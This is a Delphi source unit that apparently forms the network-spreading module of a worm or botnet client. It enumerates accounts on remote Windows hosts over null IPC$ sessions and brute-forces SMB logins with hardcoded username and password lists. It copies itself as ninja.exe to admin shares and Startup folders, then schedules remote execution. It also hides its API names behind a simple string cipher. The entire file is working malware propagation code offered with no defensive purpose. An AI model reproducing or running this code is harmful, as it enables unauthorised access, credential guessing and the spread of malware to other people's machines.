unit exNetbios;

interface

uses
  Windows,
  Winsock,
  untFunctions,
  untOutputs,
  untCrypt;

type
  TUserAccountType = (
    fltrDuplicate,        // Enumerates local user account data on a domain controller.
    fltrNormal,           // Enumerates global user account data on a computer.
    fltrProxy,            // ???
    fltrInterdomainTrust, // Enumerates domain trust account data on a domain controller.
    fltrWorkstationTrust, // Enumerates workstation or member server account data on a domain controller.
    fltrServerTrust       // Enumerates domain controller account data on a domain controller.
  );
  TUserAccountFilter = set of TUserAccountType;
  USER_INFO_0 = record
    usri0_name : PWideChar;
  end;
  PUSER_INFO_0 = ^USER_INFO_0;
  NetAPIStatus = Integer;

const
  FILTER_TEMP_DUPLICATE_ACCOUNT       = $0001;
  FILTER_NORMAL_ACCOUNT               = $0002;
  FILTER_PROXY_ACCOUNT                = $0004;
  FILTER_INTERDOMAIN_TRUST_ACCOUNT    = $0008;
  FILTER_WORKSTATION_TRUST_ACCOUNT    = $0010;
  FILTER_SERVER_TRUST_ACCOUNT         = $0020;
  MAX_PREFERRED_LENGTH   = -1;
  NERR_Success           = 0;       // Success

usernames:array[0..19] of string=(
	'administrator',	'administrador',	'administrateur',
	'administrat',	'admins',	'admin',	'staff',
	'root',	'computer',	'owner',	'student',	'teacher',
	'wwwadmin',	'guest',	'default',	'database',
	'dba',	'oracle',	'db2',	'');

passwords:array[0..139] of string=(
	'',	'administrator',	'administrador',	'administrateur',
	'administrat',	'admins',	'admin',	'adm',	'password1',
	'password',	'passwd',	'pass1234',	'pass',	'pwd',
	'007',	'1',	'12',	'123',	'1234',	'12345',	'123456',
        '1234567',	'12345678',	'123456789',	'1234567890',	'2000',
	'2001',	'2002',	'2003',	'2004',	'test',	'guest',	'none',	'demo',
	'unix',	'linux',	'changeme',	'default',	'system',	'server',
	'root',	'null',	'qwerty',	'mail',	'outlook',	'web',	'www',
	'internet',	'accounts',	'accounting',	'home',	'homeuser',
	'user',	'oem',	'oemuser',	'oeminstall',	'windows',	'win98',
	'win2k',	'winxp',	'winnt',	'win2000',	'qaz',
	'asd',	'zxc',	'qwe',	'bob',	'jen',	'joe',	'fred',	'bill',	'mike',
	'john',	'peter',	'luke',	'sam',	'sue',	'susan',	'peter',
	'brian',	'lee',	'neil',	'ian',	'chris',	'eric',	'george',
	'kate',	'bob',	'katie',	'mary',	'login',	'loginpass',
	'technical',	'backup',	'exchange',	'fuck',	'bitch',
	'slut',	'sex',	'god',	'hell',	'hello',	'domain',	'domainpass',
	'domainpassword',	'database',	'access',	'dbpass',
	'dbpassword',	'databasepass',	'data',	'databasepassword',	'db1',
	'db2',	'db1234',	'sa',	'sql',	'sqlpass',	'oainstall',
	'orainstall',	'oracle',	'ibm',	'cisco',	'dell',
	'compaq',	'siemens',	'hp',	'nokia',	'xp',
	'control',	'office',	'blank',	'winpass',
	'main',	'lan',	'internet',	'intranet',	'student',	'teacher',
	'staff');

type
  ptime_of_day_info = ^ttime_of_day_info;
  ttime_of_day_info = record
    tod_elapsedt    : DWORD;
    tod_msecs       : DWORD;
    tod_hours       : DWORD;
    tod_mins        : DWORD;
    tod_secs        : DWORD;
    tod_hunds       : DWORD;
    tod_timezone    : LongInt;
    tod_tinterval   : DWORD;
    tod_day         : DWORD;
    tod_month       : DWORD;
    tod_year        : DWORD;
    tod_weekday     : DWORD;
  end;
  at_info = record
    jobtime     :dword;
    daysofmonth :dword;
    daysofweek  :uchar;
    flags       :uchar;
    command     :pwidechar;
  end;

var
{
  WNetAddConnection2: Function(a: PNETRESOURCE; b,c: PCHAR; d: DWORD): DWORD;
  WNetAddConnection2W: Function(a: PNETRESOURCE; b,c: PCHAR; d: DWORD): DWORD;
  WNetCancelConnection2: Function(a: PCHAR; b: DWORD; c: BOOL): DWORD;
  WNetCancelConnection2W: Function(a: PCHAR; b: DWORD; c: BOOL): DWORD;
}
  lpNetApiBufferFree  : FUNCTION(Buffer:Pointer) : DWORD;STDCALL;
  lpNetRemoteTOD      : FUNCTION(UNCServerName:pChar;BufferPtr:pByte) : DWORD;STDCALL;
  lpNetScheduleJobAdd : FUNCTION(ServerName:pChar;Buffer:pByte;VAR JobID:DWORD) : DWORD;STDCALL;
  OLD_NetShareEnum    : FUNCTION(pszServer:pChar;sLevel:SmallInt;VAR Bufptr;cbBuffer:Cardinal;VAR pcEntriesRead,pcTotalAvail:Cardinal) : DWORD; STDCALL;
  NT_NetShareEnum     : FUNCTION(ServerName:pWideChar;Level:DWORD;VAR Bufptr;Prefmaxlen:DWORD;VAR EntriesRead,TotalEntries,resume_handle:DWORD) : DWORD; STDCALL;
  // NetUserEnum         : Function(a:pwidechar; b,c:dword; d:USER_INFO_0; e,f,g,h:dword): dword;
  // function NetUserEnum (serverName : PWideChar; level, filter : Integer; var buffer : Pointer; prefmaxlen : Integer; var entriesRead, totalEntries, resumeHandle : Integer) : NetAPIStatus; stdcall;
  NetUserEnum         : Function(serverName: PWideChar;
                                 level, filter: Integer;
                                 var Buffer: Pointer;
                                 prefmaxlen: Integer;
                                 var entriesRead, totalEntries, resumeHandle : Integer): NetAPIStatus; stdcall;

  Function NetBios(RemoteIP: String; Sock: TSocket): Boolean;
  Procedure InitializeFunctions;

implementation

Procedure InitializeFunctions;
Var
//  mpr_dll       :thandle;
  netapi32      :thandle;
Begin
  {
  mpr_dll := LoadLibrary('mpr.dll');
  WNetAddConnection2     := GetProcAddress(mpr_dll, 'WNetAddConnection2A');
  WNetAddConnection2W    := GetProcAddress(mpr_dll, 'WNetAddConnection2W');
  WNetCancelConnection2  := GetProcAddress(mpr_dll, 'WNetCancelConnection2A');
  WNetCancelConnection2W := GetProcAddress(mpr_dll, 'WNetCancelConnection2W');
  }

  netapi32 := loadlibrary(pchar(crypt('MFWBSJ', 35)));

//	 	fNetUserEnum = (NUE)GetProcAddress(netapi32_dll,"NetUserEnum");

  NetUserEnum := getprocaddress(netapi32, 'NetUserEnum');
  lpnetremotetod := getprocaddress(netapi32, pchar(crypt('mFWqFNLWFwlg', 35)));
  lpnetschedulejobadd := getprocaddress(netapi32, pchar(crypt('mFWp@KFGVOFiLAbGG', 35)));
  if netbios_isntbased then
  begin
    nt_netshareenum := getprocaddress(netapi32, pchar(crypt('mFWpKBQFfMVN', 35)));
    lpnetapibufferfree := getprocaddress(netapi32, pchar(crypt('mFWbSJaVEEFQeQFF', 35)));
  end else
    old_netshareenum := getprocaddress(netapi32, pchar(crypt('mFWpKBQFfMVN', 35)));
End;

Function NetConnect(szUserName, szPassword, szServer: PChar; Sock: TSocket): Boolean;
Const
SharePath     :Array[0..9] Of String = ('Admin$\system32', 'c$\winnt\system32', 'c$\windows\system32', 'c', 'd',
                                        'e', 'f', 'c$\documents and settings\all users\start menu\programs\startup\',
                                        'c$\windows\start menu\programs\startup\',
                                        'c$\winnt\profiles\all users\start menu\programs\startup\');
Var
  nr            :NETRESOURCE;
  dwResult      :DWORD;
  wszNetBIos    :PWideChar;
  wszFileName   :PWideChar;
  szRemoteFile  :String;
  Buffer        :String;
  tinfo         :PTIME_OF_DAY_INFO;
  JobID         :DWORD;
  At_Time       :AT_INFO;
  nStatus       :DWORD;
  J,I           :Integer;
  Jobtime       :DWOrd;
Begin
  FillChar(Nr, SizeOf(Nr), 0);
  nr.lpLocalName := szServer;
  nr.dwType := RESOURCETYPE_DISK;
  nr.lpLocalName := NIL;
  nr.lpProvider := NIL;

  dwResult := WNetAddConnection2(nr, szPassword, szUsername, 0);
  if dwResult <> NO_ERROR Then
  Begin
    Sleep(10);
    WNetCancelConnection2(szServer, CONNECT_UPDATE_PROFILE, True);
    Result := False;
    Exit;
  End;

  tinfo := NIL;
//  MultiByteToWideChar(CP_ACP, 0, szServer, -1, wszNetBios, sizeOf(wszNetBios));
  nStatus := lpNetRemoteTOD(pChar(szServer), @tinfo);
  if nStatus = 0 Then
  Begin
    if tinfo <> nil then
    begin
      j := 0;

      for i := 0 to sizeof(sharepath)-1 do
      begin
        szRemoteFile := szServer + '\' + sharepath[i] + '\ninja.exe';
        If (CopyFile(Pchar(ParamStr(0)), pChar(szRemoteFile), False) = false) Then
          Break else j := 1;
      end;

      if J = 0 then
      begin
        lpNetApiBufferFree(tinfo);
        WNetCancelConnection2(szServer, CONNECT_UPDATE_PROFILE, TRUE);
        Result := False;
        Exit;
      End;

      jobtime := (tinfo.tod_hours*3600+tinfo.tod_mins*60+tinfo.tod_secs)*1000+tinfo.tod_hunds*10;
      if tinfo.tod_timezone <> -1 then jobtime := jobtime - tinfo.tod_timezone * 60000;
      jobtime := jobtime + 3000;

      zeromemory(@at_time, sizeof(at_info));
      at_time.jobtime := jobtime * 6000;
      stringtowidechar(szRemoteFile, wszFileName, 1024);
      at_time.command := wszFileName;

      nStatus := lpNetScheduleJobAdd(pChar(szServer), @at_time, jobid);
      if nStatus = 0 then
      begin
        // sploited.
        Result := True;
      end;
    end;
  End;
  WNetCancelConnection2(szServer, CONNECT_UPDATE_PROFILE, TRUE);
End;

Function RootBox(szUserName, szServer: PChar; Sock: TSocket): Boolean;
Var
  I     :Integer;
Begin
  Result := False;
  I := 0;
  For I := 0 To SizeOf(passwords)-1 Do
  Begin
    If (NetConnect(szUserName, pChar(passwords[i]), szServer, Sock) = True) Then
    Begin
      Result := True;
      Break;
    End;
    Sleep(200);
  End;
End;

Function NetBios(RemoteIP: String; Sock: TSocket): Boolean;
Var
  szUserName    :String;
  RemoteName    :String;
  szServer      :String;

  pszServer     :WChar;
  sName         :PWChar;
  pBuf          :Pointer;
  pTmpBuf       :PUSER_INFO_0;
  dwLevel, dwPrefMaxLen, dwEntriesRead,
  dwTotalEntries, dwResumeHandle, dwTotalCount: Integer;
  nStatus       :DWord;
  nr            :NETRESOURCE;
  I             :dword;
Begin
  szServer := '\\' + RemoteIP;

  GetMem(sName, 500);
  stringtowidechar(szServer, sName, 500);
//  pszServer:=sName;

  nr.lpLocalName := NIL;
  nr.lpProvider := NIL;
  nr.dwType := RESOURCETYPE_ANY;
  RemoteName := szServer+'\ipc$';
  nr.lpRemoteName := pChar(RemoteName);

  if WNetAddConnection2(nr, '', '', 0) <> NO_ERROR Then
  Begin
    WNetCancelConnection2(pChar(RemoteName), 0, TRUE);
    Result := False;
    Exit;
  End;

  Repeat
(*
procedure TForm1.Button1Click(Sender: TObject);
var
  wServerName : WideString;
  rv : NetAPIStatus;
  buffer : pointer;
  i, entriesRead, totalEntries : Integer;
  p : PUSER_INFO_0;
begin
  listbox1.Clear;
  wServerName:=GetComputerName;
  rv := NetUserEnum (PWideChar (wServerName), 0, UserAccountFilterToDWORD ([fltrNormal]), buffer, MAX_PREFERRED_LENGTH,
                     entriesRead, totalEntries, NIL_HANDLE);
  if rv = NERR_Success then
    try
      p := PUSER_INFO_0 (buffer);
      for i := 0 to entriesRead - 1 do
      begin
        listbox1.items.Add (p^.usri0_name);
        Inc (p)
      end
    finally
      NetAPIBufferFree (buffer)
    end
  else
    ShowMessage('Error');
end;
*)
    nStatus := NetUserEnum(sName, 0, FILTER_NORMAL_ACCOUNT, pBuf, MAX_PREFERRED_LENGTH, dwEntriesRead, dwtotalEntries, dwResumeHandle);
    WNetCancelConnection2(pChar(RemoteName), 0, TRUE);

    If ((nStatus = NERR_SUCCESS) or (nStatus = ERROR_MORE_DATA)) Then
    begin
      if pBuf <> NIL Then
      Begin
        pTmpBuf := PUSER_INFO_0(pBuf);
        For I := 0 to dwEntriesRead -1 Do
        Begin


          If pTmpBuf^.usri0_name = NIL Then
            Break;
          If RootBox(pChar(pTmpBuf^.usri0_name), pChar(szServer), Sock) = True Then
            Break;

          Inc(pTmpBuf^.usri0_name);
          Inc(dwTotalCount);
        End;
      End;
    End;

    If pBuf <> NIL Then
    Begin
      lpNetApiBufferFree(pBuf);
      pBuf := NIL;
    End;
  Until nStatus <> ERROR_MORE_DATA;

  If pBuf <> NIL Then
    lpNetApiBufferFree(pBuf);

  If nStatus = ERROR_ACCESS_DENIED Then
    For I := 0 To SizeOf(Usernames)-1 Do
      If RootBox(pChar(Usernames[i]), pChar(szServer), Sock) = True Then
        Break;

  Result := True;
End;

end.

